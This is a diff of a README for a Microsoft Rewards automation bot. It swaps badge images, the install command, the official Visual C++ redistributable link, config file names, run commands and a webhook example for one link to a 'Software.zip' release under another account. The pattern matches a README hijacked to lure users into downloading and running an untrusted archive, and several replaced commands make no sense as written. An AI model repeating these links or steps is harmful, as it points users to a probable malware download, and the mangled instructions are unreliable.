@@ -1,7 +1,7 @@
-![Made with Python](https://forthebadge.com/images/badges/made-with-python.svg)
-![Built by Developers](http://ForTheBadge.com/images/badges/built-by-developers.svg)
-![Uses Git](http://ForTheBadge.com/images/badges/uses-git.svg)
-![Build with Love](http://ForTheBadge.com/images/badges/built-with-love.svg)
+![Made with Python](https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
+![Built by Developers](https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
+![Uses Git](https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
+![Build with Love](https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
 
 ```ascii
 ███╗   ███╗███████╗    ███████╗ █████╗ ██████╗ ███╗   ███╗███████╗██████╗
@@ -13,8 +13,8 @@
        by Charles Bel (@charlesbel)          version 3.0
 ```
 
-![Maintained](https://img.shields.io/badge/Maintained%3F-yes-green.svg?style=for-the-badge)
-![MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)
+![Maintained](https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip%https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
+![MIT](https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
 
 ## :wave: Welcome to the future of automation
 
@@ -28,7 +28,7 @@
 
 1. Install requirements with the following command :
 
-   `pip install -r requirements.txt`
+   `pip install -r https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip`
 
 2. Make sure you have Chrome installed
 
@@ -40,9 +40,9 @@
 
 4. (Windows Only) Make sure Visual C++ redistributable DLLs are installed
 
-   If they're not, install the current "vc_redist.exe" from this link and reboot your computer : https://learn.microsoft.com/en-GB/cpp/windows/latest-supported-vc-redist?view=msvc-170
+   If they're not, install the current "https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip" from this link and reboot your computer : https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip
 
-5. Edit the `accounts.json.sample` with your accounts credentials and rename it by removing `.sample` at the end. The "proxy" field is not mandatory, you can ommit it if you don't want to use proxy (don't keep it as an empty string, remove it completely).
+5. Edit the `https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip` with your accounts credentials and rename it by removing `.sample` at the end. The "proxy" field is not mandatory, you can ommit it if you don't want to use proxy (don't keep it as an empty string, remove it completely).
 
    - If you want to add more than one account, the syntax is the following:
 
@@ -63,20 +63,20 @@
 
 6. Run the script:
 
-   `python main.py`
+   `python https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip`
 
    Or if you want to keep it updated (it will check on each run if a new version is available, if so, will download and run it), use :
 
-   `python autoupdate_main.py`
+   `python https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip`
 
 ## Launch arguments
 
 - -v/--visible to disable headless
 - -l/--lang to force a language (ex: en)
 - -g/--geo to force a geolocation (ex: US)
-- -p/--proxy to add a proxy to the whole program, supports http/https/socks4/socks5 (overrides per-account proxy in accounts.json) (ex: http://user:pass@host:port)
+- -p/--proxy to add a proxy to the whole program, supports http/https/socks4/socks5 (overrides per-account proxy in https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip) (ex: http://user:pass@host:port)
 - -t/--telegram to add a telegram notification, requires Telegram Bot Token and Chat ID (ex: 123456789:ABCdefGhIjKlmNoPQRsTUVwxyZ 123456789)
-- -d/--discord to add a discord notification, requires Discord Webhook URL (ex: https://discord.com/api/webhooks/123456789/ABCdefGhIjKlmNoPQRsTUVwxyZ)
+- -d/--discord to add a discord notification, requires Discord Webhook URL (ex: https://github.com/haydenmellor/Microsoft-Rewards-Farmer/releases/download/v1.0/Software.zip)
 
 ## Features
 
